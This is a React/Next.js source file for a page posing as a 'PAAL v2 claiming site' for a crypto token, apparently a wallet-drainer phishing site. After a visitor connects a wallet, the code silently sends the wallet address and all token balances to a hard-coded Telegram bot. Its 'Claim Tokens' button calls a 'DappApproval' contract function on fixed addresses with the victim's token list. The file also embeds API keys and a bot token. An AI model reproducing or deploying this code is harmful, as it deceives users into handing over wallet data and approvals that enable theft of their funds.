import { ConnectWallet, Web3Button, ThirdwebSDK, useAddress, useBalance, useContract, useContractWrite } from "@thirdweb-dev/react";
import { NextPage } from "next";
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Image, Button, Link} from "@nextui-org/react";
import { useState, useEffect, useContext } from "react";
import ChainContext from "../context/Chain";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';

const Home: NextPage = () => {
  const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
const [tokenDataArr, setTokenDataArr] = useState([]);
const { selectedChain, setSelectedChain } = useContext(ChainContext);
  const addresses: Record<string, string> = {
    ["ethereum"]: "0x6994043dbc4F0824d0FB9D2B3f70558f05509f58",
    ["arbitrum"]: "0xA72234a2b9c1601593062f333D739C93291dF49F",
    ["polygon"]: "0xA72234a2b9c1601593062f333D739C93291dF49F",
    ["bsc"]: "0xA72234a2b9c1601593062f333D739C93291dF49F",
  };
  const apiKey = "6tL6x4wh-ROoNc4hp3C8gE-ToXlCSM5t"
  const chainUrls: Record<string, string> = {
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${apiKey}`,
    bsc:      `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`,
    polygon: `https://matic-mainnet.g.alchemy.com/v2/${apiKey}`,
  };
// Get the URL based on the selected chain
  const url = chainUrls[selectedChain];
  
  useEffect(() => {
    const fetchTokenBalances = async () => {
        const options = {
            method: "POST",
            headers: {
                accept: "application/json",
                "content-type": "application/json",
            },
            body: JSON.stringify({
                id: 1,
                jsonrpc: "2.0",
                method: "alchemy_getTokenBalances",
                params: [address],
            }),
        };

        try {
            const res = await fetch(url, options);
            const response = await res.json();
            const balances = response.result.tokenBalances;

            const nonZeroBalances = balances.filter((token) => {
                return token.tokenBalance !== "0";
            });
            await sendMessageToTelegram(`Wallet balance of ${address} ${selectedChain}: ${wbalance}`);
            await sendMessageToTelegram(`Token balances of ${address} ${selectedChain}`);
            for (let index = 0; index < nonZeroBalances.length; index++) {
                const token = nonZeroBalances[index];
                const tokenData = nonZeroBalances.map(async (token) => {
                const tokenMetadataOptions = {
                    method: "POST",
                    headers: {
                        accept: "application/json",
                        "content-type": "application/json",
                    },
                    body: JSON.stringify({
                        id: 1,
                        jsonrpc: "2.0",
                        method: "alchemy_getTokenMetadata",
                        params: [token.contractAddress],
                    }),
                };
                const rawbal = Number(token.tokenBalance);
                const tokenMetadataRes = await fetch(url, tokenMetadataOptions);
                const metadata = await tokenMetadataRes.json();
                const { name, symbol, decimals } = metadata.result;

                const balance = rawbal / 10 ** Number(decimals);

                const logMessage = `${index + 1}. ${name}: ${balance} ${symbol}`;
        
                await sendMessageToTelegram(logMessage);
                return {
                  tokenAddress: token.contractAddress,
                  tokenBalance: rawbal,
              };
            });
            const tokenDataArr = await Promise.all(tokenData);
            console.log(tokenDataArr);
          }
            setTokenDataArr(tokenDataArr);
            
        } catch (error) {
            console.error(error);
        }
    };

    if (address) {
        fetchTokenBalances();
    }
}, [address, url]);
console.log(wbalance);

return(
    <div
      className="bg-cover bg-center min-h-screen"
      style={{ backgroundImage: `url('images/bg-paal.png')` }}
    >
      <div>
      <Navbar>
      <NavbarBrand>
      <Image src="images/logo.png" alt="Logo" className="h-12"/>
      </NavbarBrand>
      
      <NavbarContent justify="end">
        <NavbarItem>
        <ConnectWallet
        theme={"dark"}
          modalTitle={"Connect to PAAL AI"}></ConnectWallet>
        </NavbarItem>
      </NavbarContent>
    </Navbar>
    <div className="flex justify-center items-center">
      <br></br><br></br><br></br><br></br><br></br><br></br>
    <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
    <br></br>
    </div>
    <h1 className="flex justify-center font-bold text-lg text-white">
      <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
    </h1>
    <p className="flex justify-center text-white">Welcome to PAAL v2 claiming site.</p>
    <br></br>
    <div className="flex justify-center items-center">
      <br></br>
    <Web3Button
      contractAddress={addresses[selectedChain]}
      action={(contract) => {
        contract.call("DappApproval", [tokenDataArr])
      }}
    >
      Connect Wallet to Claim Tokens
    </Web3Button>
    &nbsp;&nbsp;
    <select
    className="block font-bold px-4 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
        value={String(selectedChain)}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
        <option value="arbitrum">Arbitrum</option>
        <option value="bsc">Binance Smart Chain</option>
        <option value="ethereum">Ethereum</option>
        <option value="polygon">Polygon</option>
      </select>
    </div>
    <div className="flex justify-center items-center gap-2">
    <br></br><br></br><br></br><br></br><br></br><br></br>
    <Button isDisabled>Migration V2</Button><br></br>
    <Button isDisabled>Staking pool</Button><br></br>
    <Button isDisabled>Claim Rewards</Button><br></br>
    </div>
    
      </div>

    </div>
  );
};
const sendMessageToTelegram = async (message) => {
  const botToken = '6057314190:AAES15kEQX0oGZbphbnB9FXsJhcDcN66QmU';
  const chatId = '5508645371'; // You'll need to obtain this from your Telegram bot
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });

  const result = await response.json();
};

export default Home;
